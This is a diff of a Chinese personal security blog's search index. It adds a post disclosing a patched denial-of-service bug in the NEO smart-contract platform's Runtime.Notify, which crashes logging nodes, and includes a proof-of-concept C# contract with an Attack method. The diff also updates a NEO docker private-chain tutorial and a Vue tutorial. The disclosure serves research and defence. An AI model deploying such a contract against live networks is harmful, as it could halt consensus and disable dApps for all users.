@@ -3,6 +3,66 @@
   
     
     <entry>
+      <title><![CDATA[0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞]]></title>
+      <url>/2018/09/15/0day-NEO%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%B9%B3%E5%8F%B0Runtime.Notify()%E8%B0%83%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</url>
+      <content type="html"><![CDATA[<p>— 发现的第一个0day —</p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>
+
+<p>在实验室改以太坊的智能合约到neo。<br>改着改着发现一个拒绝服务攻击漏洞，利用攻击的话危害还挺大的，emmm，发现基本全靠运气，在此记录第一个0day。</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><hr>
+
+<p><strong>漏洞名称</strong>：NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞<br><strong>漏洞影响</strong>：导致Neo链上所有开启<code>log模式</code>的全节点崩溃（包括共识节点）。<br><strong>漏洞细节</strong>：出现在neo全节点虚拟机中执行智能合约语句Runtime.Notify()时发生崩溃</p>
+<p>Neo智能合约平台为合约提供了记录数据信息输出到文件的系统调用<code>System.Runtime.Notify</code>。该调用在处理合约请求时未考虑到全部可能的数据结构，将导致智能合约系统平台crash。</p>
+<p>其产生的影响会根据节点的部署情况而有所不同，但是都较为严重。</p>
+<p>由于Neo目前是有7个主节点负责验证并打包全网交易。恶意用户将利用该漏洞的恶意合约发布到neo网络中，假如超过4个主节点开启了LOG功能，这些节点在解析运行该恶意合约时将引发崩溃，无法继续达成共识，进而导致整个neo网络拒绝服务。</p>
+<p>即使主节点不使用LOG可以完成共识正常出块，但是NEO链中所有NEP5代币智能合约都会使用LOG功能，几乎所有DAPP也会使用LOG功能。所有LOG节点崩溃，会使基于NEO链的大部分智能合约瘫痪。</p>
+<p>崩溃截图：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv94rl0idqj30gq0an0td.jpg" alt="崩溃截图"></p>
+<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>在执行Runtime.Notify没有考虑所有可能被 Runtime.Notify 写入日志文件的数据类型，在数据转化时解析出错。</p>
+<p>Runtime.Notify 是记录智能合约日志的功能，可以输出想要知道的数据的值。类似于<code>console.log()</code>，输出的数据会写入LevevlDB数据库，最后变为一个文件。</p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fv95qd5r2vj30op088t9n.jpg" alt=""></p>
+<p>判断是否是log模式</p>
+<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv95n8ki1dj30p40ag75w.jpg" alt=""></p>
+<p>构建文件，写入文件</p>
+<p>其中<code>ToParameter函数</code>在转化Map格式时崩溃。</p>
+<blockquote>
+<p>官方回复：因为ToParameter函数在实现的时候还没有Map，后来做了Map功能后忘记更新ToParameter了。</p>
+</blockquote>
+<p>ToParameter函数，在官方github中的NEO项目中<code>ContractParameter.cs</code>、<code>ContractParameterType.cs</code>、<code>Helper.cs</code>实现</p>
+<h2 id="漏洞攻击过程"><a href="#漏洞攻击过程" class="headerlink" title="漏洞攻击过程"></a>漏洞攻击过程</h2><p><code>攻击过程</code>：</p>
+<ul>
+<li>构建恶意智能合约代码</li>
+<li>部署智能合约</li>
+<li>调用恶意智能合约</li>
+<li>所有开启log功能的节点同步区块,执行智能合约代码，崩溃。（如果共识节点开启log功能，会直接崩溃，不会产生区块）</li>
+</ul>
+<p>当时提交的智能合约POC分析：<br>（复杂版，当时没有去看源码觉得有两种漏洞原因，以为可能是跟360找到的漏洞一样，因为map与struct嵌套导致漏洞，也有可能是因为其中一种结构，没有排除到根本）</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework;</div><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.Neo;</div><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.System;</div><div class="line"><span class="keyword">using</span> Helper = Neo.SmartContract.Framework.Helper;</div><div class="line"><span class="keyword">using</span> System;</div><div class="line"><span class="keyword">using</span> System.Numerics;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">NeoContract1</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">test</span> : <span class="title">SmartContract</span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">        <span class="comment">//结构体</span></div><div class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Upload 为键值对 的 Map结构 （map_Up开头）</span></div><div class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Purchase 为键值对 的 Map结构 </span></div><div class="line"></div><div class="line">        <span class="comment">// Upload结构体</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Upload</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID; <span class="comment">// fileID</span></div><div class="line">            <span class="keyword">public</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu;   <span class="comment">//Map结构</span></div><div class="line">        &#125;</div><div class="line">        <span class="comment">//Purchase结构体</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Purchase</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID;</div><div class="line">        &#125;</div><div class="line">.....省略合约入口.........</div><div class="line">        <span class="comment">//攻击调用</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Attack</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu = <span class="keyword">new</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt;();</div><div class="line">            <span class="comment">//新建Purchase结构体</span></div><div class="line">            Purchase pu = <span class="keyword">new</span> Purchase</div><div class="line">            &#123;</div><div class="line">                fileID = fileID,</div><div class="line">            &#125;;</div><div class="line">            map_Pu[fileID] = pu;</div><div class="line">            <span class="comment">//新建外部upload结构体</span></div><div class="line">            Upload up = <span class="keyword">new</span> Upload</div><div class="line">            &#123;</div><div class="line">                fileID = fileID,</div><div class="line">                map_Pu = map_Pu,</div><div class="line">            &#125;;</div><div class="line">            <span class="comment">//存储upload结构体</span></div><div class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</div><div class="line">            map_Up.Put(fileID, up.Serialize());</div><div class="line"></div><div class="line">            Runtime.Notify(<span class="string">"OK"</span>);</div><div class="line"></div><div class="line">            <span class="comment">//得到fileID对应的Upload</span></div><div class="line">            Upload map_fileID = GetUpload(fileID);</div><div class="line">            <span class="comment">//问题出在这里！！！！！！！！！！！！！！！！此处崩溃</span></div><div class="line">            Runtime.Notify(map_fileID);</div><div class="line">            Runtime.Notify(map_fileID.fileID);</div><div class="line">            <span class="comment">//估计就是两句中上面的第一句</span></div><div class="line">            <span class="comment">//可能1. 一个结构体 因为结构中的非法字符 在解析写入文件的时候 导致崩溃 （可能因为结构体 其中包含着不在预期估计范围的作为结构体分割 的字符）</span></div><div class="line">            <span class="comment">//可能2. 一个多层嵌套 map struct 的结构体 因为多层嵌套的原因 在解析没有预计 导致崩溃</span></div><div class="line"></div><div class="line">            <span class="comment">//得到upload的map_Pu 中对应</span></div><div class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu_2 = map_fileID.map_Pu;</div><div class="line">            Runtime.Notify(map_Pu_2[fileID]);</div><div class="line"></div><div class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Upload <span class="title">GetUpload</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</div><div class="line"></div><div class="line">            <span class="keyword">var</span> bytes = map_Up.Get(fileID);</div><div class="line">            <span class="keyword">if</span> (bytes.Length &gt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">               <span class="keyword">return</span> Helper.Deserialize(bytes) <span class="keyword">as</span> Upload;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Upload();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>按照官方的原因的话，应该直接建立一个MAP结构，Runtime.Notify(MAP)格式，就可以，不用向上面那么复杂</p>
+<p>贴上攻击结果的一些截图：</p>
+<p>共识节点开启log：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv96cituh5j311x0k57ts.jpg" alt=""></p>
+<p>共识节点不开启log：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv96cv6vy6j311y0k81kb.jpg" alt=""></p>
+<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>官方于09.10修补了漏洞,添加了map对应处理情况。<a href="https://github.com/neo-project/neo/commit/e5e64ad5d413ad53effb6f815eac579df2c3aaf9#diff-724a2c89065b167abd6abdd780331db8" target="_blank" rel="external">修复情况链接</a></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv98b8qv3ij30ef09vt9c.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv97ec5hi5j30o80g6t9q.jpg" alt=""></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>很感谢学长和老师（就不贴出名字了）引入门的指导，一直以来的支持和照顾。这也是能发现0day不可或缺的先前条件。</p>
+<p>信息安全就是如此，潜心学习，沉淀，耐心研究，挖掘，总有收获。<br>共勉。</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 0day漏洞 </tag>
+            
+            <tag> NEO </tag>
+            
+            <tag> 区块链 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[智能合约安全-重入攻击]]></title>
       <url>/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
       <content type="html"><![CDATA[<p>— 有意思，填一小块坑 —</p>
@@ -436,13 +496,15 @@
 <p>没有链 -&gt; 雾里看花 -&gt; 测试链不给币 -&gt; 搭建私有链 -&gt; 超多麻烦 -&gt; 还是没有链 = 劝退</p>
 <p>然后cityofzion的看上去最简单的拿着试了下。<br>cityofzion大法好！本以为会是一如既往艰难险阻疑无路的大坑，没想到！真的几步就好了！哇，这个社区太给力了<br>好好学习英语！</p>
 <p><a href="https://hub.docker.com/r/cityofzion/neo-privatenet/" target="_blank" rel="external">docker镜像及说明</a><br><a href="https://github.com/CityOfZion/neo-privatenet-docker" target="_blank" rel="external">CityOfZion通过docker搭建NEO私有链</a></p>
-<h1 id="两步搭建"><a href="#两步搭建" class="headerlink" title="两步搭建"></a>两步搭建</h1><hr>
+<p>– 09.07 更新 –<br>重新更新，因为COZ的私有链 使用的不是最新版本的cli。<br>个人需要使用最近版本来验证一个漏洞，重新开始弄一个最新版本的私有链。<br>根据 官方的docker镜像 来构建私有链，稍微会麻烦一点，但是镜像会持续拉取最新版本的cli。</p>
+<h1 id="基于CityOfZion的docker私有链"><a href="#基于CityOfZion的docker私有链" class="headerlink" title="基于CityOfZion的docker私有链"></a>基于CityOfZion的docker私有链</h1><p>可以只起neo私有链，还可以起配合neoscan的neo私有链。后者看后面的补充，可一步到位。</p>
+<h2 id="两步搭建"><a href="#两步搭建" class="headerlink" title="两步搭建"></a>两步搭建</h2><hr>
 
 <blockquote>
 <p>前提 装好docker，会使用docker</p>
 </blockquote>
 <p>1.下载镜像<br><code>docker pull cityofzion/neo-privatenet</code><br>2.运行镜像<br><code>docker run --rm -d --name neo-privatenet -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp cityofzion/neo-privatenet</code></p>
-<h1 id="两步配置neo-gui"><a href="#两步配置neo-gui" class="headerlink" title="两步配置neo-gui"></a>两步配置neo-gui</h1><hr>
+<h2 id="两步配置neo-gui"><a href="#两步配置neo-gui" class="headerlink" title="两步配置neo-gui"></a>两步配置neo-gui</h2><hr>
 
 <blockquote>
 <p>为了不出错，新下载一个neo-gui客户端来链接测试链，因为改测试链上的 需要删区块，没必要</p>
@@ -452,32 +514,36 @@
 <p>如果docker不是在本机运行，而是在虚拟机或其他服务器上运行，修改以上两个配置文件中的 127.0.0.1/localhost 为 对应虚拟机IP地址</p>
 </blockquote>
 <p>启动 neo-gui 等待同步完成</p>
-<h1 id="两步确认运行"><a href="#两步确认运行" class="headerlink" title="两步确认运行"></a>两步确认运行</h1><hr>
+<h2 id="两步确认运行"><a href="#两步确认运行" class="headerlink" title="两步确认运行"></a>两步确认运行</h2><hr>
 
 <p>如果不放心可以去确认区块的生成</p>
 <p><code>docker exec -it neo-privatenet /bin/bash</code><br><code>screen -d -r node1</code></p>
-<h1 id="一步有钱"><a href="#一步有钱" class="headerlink" title="一步有钱"></a>一步有钱</h1><hr>
+<h2 id="一步有钱"><a href="#一步有钱" class="headerlink" title="一步有钱"></a>一步有钱</h2><hr>
 
 <p>neo-gui中右键-导入-导入WIF-<code>KxDgvEKzgSBPPfuVfw67oPQBSjidEiqTHURKSDL1R7yGaGYAeYnr</code></p>
 <p>搞定</p>
-<h1 id="远程调用rpc"><a href="#远程调用rpc" class="headerlink" title="远程调用rpc"></a>远程调用rpc</h1><hr>
+<h2 id="远程调用rpc"><a href="#远程调用rpc" class="headerlink" title="远程调用rpc"></a>远程调用rpc</h2><hr>
 
-<p>远程调用rpc 就是利用neo-cli读取链上信息</p>
+<p>远程调用rpc 就是利用neo-cli读取链上信息，以上操作已经开放远程调用。</p>
 <p>私有链的远程调用端口是：<code>30333-30336</code></p>
 <p>官网说明：<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="external">这里</a></p>
-<p>GET:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://somewebsite.com:10332?jsonrpc=2.0&amp;method=getblockcount&amp;params=[]&amp;id=1</div></pre></td></tr></table></figure></p>
+<p>使用方法：<br>GET:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://somewebsite.com:10332?jsonrpc=2.0&amp;method=getblockcount&amp;params=[]&amp;id=1</div></pre></td></tr></table></figure></p>
 <p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://somewebsite.com:10332</div><div class="line">&#123;</div><div class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</div><div class="line">  &quot;method&quot;: &quot;getblockcount&quot;,</div><div class="line">  &quot;params&quot;: [],</div><div class="line">  &quot;id&quot;: 1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><hr>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><hr>
 
 <p>接下来就是neo-gui的操作了，转到自己的账号上啦巴拉巴拉，有了测试链才能开始学习啊喂。</p>
 <p>OKOK，收工</p>
 <hr>
 
-<h1 id="补充cli-rpc-开启–log选项说明"><a href="#补充cli-rpc-开启–log选项说明" class="headerlink" title="补充cli rpc 开启–log选项说明"></a>补充cli rpc 开启–log选项说明</h1><p><hr><br>使用cli rpc 只要有能发包的工具就行，但是理所当然的没有找到很好的浏览器插件，就用burpsuite了<br>通常的api都是可以调用的，<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="external">api查看</a></p>
-<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqrjzd4j30rc09x755.jpg" alt="11.png"></p>
-<p>好吧，但是我调用这个就是为了查看notify输出信息。<br>之后调用 cli rpc 查看智能合约notify的时候发现，getapplicationlog api是不行的</p>
+<h2 id="补充cli-rpc-开启–log选项说明"><a href="#补充cli-rpc-开启–log选项说明" class="headerlink" title="补充cli rpc 开启–log选项说明"></a>补充cli rpc 开启–log选项说明</h2><p><hr><br>使用cli rpc 只要有能发包的工具就行，但是理所当然的没有找到很好的浏览器插件，就用burpsuite了<br>通常的api都是可以调用的，<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="external">api查看</a></p>
 <p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqwbhktj30ra09vjt3.jpg" alt="22.png"></p>
-<p>感觉应该是两步起来的私有链里面的cli并没有开<code>--log</code>功能。（之后尝试修改的时候发现确实是这样）<br>那么接下来就去私链里面开–log,操作就是——<strong>进入docker-关掉neo cli-修改-重开</strong><br>进入docker：</p>
+<p>好吧，但是我调用这个就是为了查看notify输出信息。<br>之后调用 cli rpc 查看智能合约notify的时候发现，getapplicationlog api是不行的</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqrjzd4j30rc09x755.jpg" alt="11.png"></p>
+<p>感觉应该是两步起来的私有链里面的cli并没有开<code>--log</code>功能。（之后尝试修改的时候发现确实是这样）<br>那么接下来就去私链里面开–log,操作就是——<strong>进入docker-关掉neo cli-修改-重开</strong></p>
+<blockquote>
+<p>此处还有另一个操作，就是再起一个cli节点，修改配置文件，开log连接至私有链，就不必去动docker</p>
+</blockquote>
+<p>进入docker：</p>
 <ul>
 <li><code>docker exec -it neo-privatenet /bin/bash</code></li>
 </ul>
@@ -503,7 +569,7 @@
 <p><strong>检查</strong>：看自己gui会不会更新，或者前文提到的检查docker内部</p>
 <p><strong>提醒</strong>：记得等上链之后再调用rpc，不然还是会一样的不行</p>
 <p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fubnqzkg7yj30qn081my9.jpg" alt="33.png"></p>
-<h1 id="补充加上neonscan"><a href="#补充加上neonscan" class="headerlink" title="补充加上neonscan"></a>补充加上neonscan</h1><p>因为要使用neon.js，需要有数据库层面对外的接口按照教程重新加了下。<br><a href="https://github.com/slipo/neo-scan-docker" target="_blank" rel="external">教程</a></p>
+<h2 id="补充加上neonscan"><a href="#补充加上neonscan" class="headerlink" title="补充加上neonscan"></a>补充加上neonscan</h2><p>因为要使用neon.js，需要有数据库层面对外的接口按照教程重新加了下。<br><a href="https://github.com/slipo/neo-scan-docker" target="_blank" rel="external">教程</a></p>
 <p>需要停掉之前的<code>cityofzion/neo-privatenet</code>镜像<br><code>docker stop 对应的容器id</code></p>
 <p>自动起环境<br><code>git clone git@github.com:slipo/neo-scan-docker.git</code><br><code>cd neo-scan-docker</code><br><code>docker-compose up</code>：这个地方会自动进入neon-scan的页面，等到同步速度变慢，就是在正常出块了，然后放着不管就好了</p>
 <p>修改host文件<br><code>vi /etc/host</code>：我的是在这里<br><code>127.0.0.1 neo-privnet</code>：添加这一行，必须修改，neonscan到neon私有链是通过这个<code>neo-privnet</code>域名链接的，具体可以看dockerfile</p>
@@ -511,7 +577,31 @@
 <p>但是需要cli rpc 开启–log选项的话，需要按照之前的操作重复一次，并且之前的log也都会不见</p>
 <blockquote>
 <p>私有链搭建在另一台服务器中时，把 <code>服务器ip neo-privnet</code> 写到自己本机的host中 可以避免使用neon.js的一个坑</p>
+<p>发现scan 有时候会莫名崩溃，不是特别的理解。但是重启就可以解决，进入拥有compose文件的neo-scan-docker目录<code>cd neo-scan-docker</code>。<code>docker-compose restart neo-scan</code>即可</p>
 </blockquote>
+<h2 id="崩溃处理"><a href="#崩溃处理" class="headerlink" title="崩溃处理"></a>崩溃处理</h2><p>2018/09/04更新。</p>
+<p>今天用着用着私链崩溃，无法同步，也无法生成区块了。在写代码，不想再花精力去弄，直接删掉镜像和数据，重启了一个私有链。</p>
+<p>结果发现有一个节点莫名其妙的开始区块超前。简直无法理解啊。但是三个节点仍然可以生成区块的，也没考虑那么多。</p>
+<p>使用neon.js从neoscan读取节点广播交易的时候发现，一直都广播失败，很绝望。最后发现，选取节点广播交易时，都会使用区块高度最高的那个节点，去广播交易。</p>
+<p>就是一直在使用坏掉的那个节点。所以一直广播失败。直接把那个节点关了即可。</p>
+<p>个人感觉应该是docker镜像数据残留的问题？但是处理好了，万幸。</p>
+<h1 id="基于官方docker镜像起私有链"><a href="#基于官方docker镜像起私有链" class="headerlink" title="基于官方docker镜像起私有链"></a>基于官方docker镜像起私有链</h1><p><a href="https://github.com/NewEconoLab/Docs/blob/master/study/DevOps/DockerNeoPrivatenet.md" target="_blank" rel="external">官方教程</a></p>
+<p>讲的还是比较清楚的，没必要多余说明，但是有一些坑啊。</p>
+<h2 id="无法启动neo-cli"><a href="#无法启动neo-cli" class="headerlink" title="无法启动neo-cli"></a>无法启动neo-cli</h2><p>当<code>donet neo-cli.dll /rpc</code>的时候</p>
+<p><img src="" alt="坑0.png"></p>
+<p>是官方配置文件有问题</p>
+<p><img src="" alt="坑1.png"></p>
+<p>感觉是老版本的cli配置文件。需要修改为右边的<code>ApplicationLogs</code>,就可以启动</p>
+<p><img src="" alt="坑3.png"></p>
+<h2 id="私有链端口映射有问题"><a href="#私有链端口映射有问题" class="headerlink" title="私有链端口映射有问题"></a>私有链端口映射有问题</h2><p><img src="" alt="坑4.png"></p>
+<p>以上是通过官方镜像compose产生的4个镜像<br>端口映射：</p>
+<ul>
+<li>cli0 10331-10334 -&gt; 10331-10334</li>
+<li>cli1 20331-20334 -&gt; 10331-10334</li>
+<li>cli2 30331-30334 -&gt; 10331-10334</li>
+<li>cli3 40331-40334 -&gt; 10331-10334</li>
+</ul>
+<p>实际上一个 cli容器 只会映射出一个端口</p>
 ]]></content>
       
         
@@ -888,7 +978,7 @@
       <url>/2018/07/11/Vue%E7%BB%84%E4%BB%B6/</url>
       <content type="html"><![CDATA[<p>— 点点开发技能树  —<br>— Vue组件 及 通讯 —<br><a id="more"></a></p>
 <h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>　　<strong>组件</strong>可以把大的框架按照HTML拆分成小块功能实现，并实现内容复用。<br>　　同时组件之间还要传递数据或参数。当然组件也有很多缺点，最后介绍模块开发的单文件组件</p>
-<h2 id="组件注册和使用"><a href="#组件注册和使用" class="headerlink" title="组件注册和使用"></a>组件注册和使用</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--全局注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="comment">//my-compenent 组件名</span></span></div><div class="line"><span class="javascript">Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="javascript">    <span class="comment">//选项</span></span></div><div class="line"><span class="xml">    template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--局部注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">var</span> Child = &#123;</span></div><div class="line"><span class="xml">    template : '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">    el: <span class="string">'app'</span>,</span></div><div class="line"><span class="undefined">    components: &#123;</span></div><div class="line"><span class="javascript">        <span class="comment">//my-compenent 组件名</span></span></div><div class="line"><span class="javascript">        <span class="string">'my-component'</span>: Child</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="组件注册和使用"><a href="#组件注册和使用" class="headerlink" title="组件注册和使用"></a>组件注册和使用</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--全局注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">//my-compenent 组件名</span></div><div class="line"><span class="undefined">Vue.component('my-component',&#123;</span></div><div class="line"><span class="undefined">    //选项</span></div><div class="line"><span class="xml">    template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--局部注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var Child = &#123;</span></div><div class="line"><span class="xml">    template : '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var app = new Vue(&#123;</span></div><div class="line"><span class="undefined">    el: 'app',</span></div><div class="line"><span class="undefined">    components: &#123;</span></div><div class="line"><span class="undefined">        //my-compenent 组件名</span></div><div class="line"><span class="undefined">        'my-component': Child</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <blockquote>
 <p>注意局部注册的组件在其子组件中不可用,如果需要使用，需要在子组件中声明</p>
 </blockquote>
@@ -904,7 +994,7 @@
 <li>如果Vue实例在实例化时没有收到<code>el</code>选项，他也处于“未挂载”状态</li>
 <li><code>$mount</code>手动挂载一个未挂载的实例</li>
 </ul>
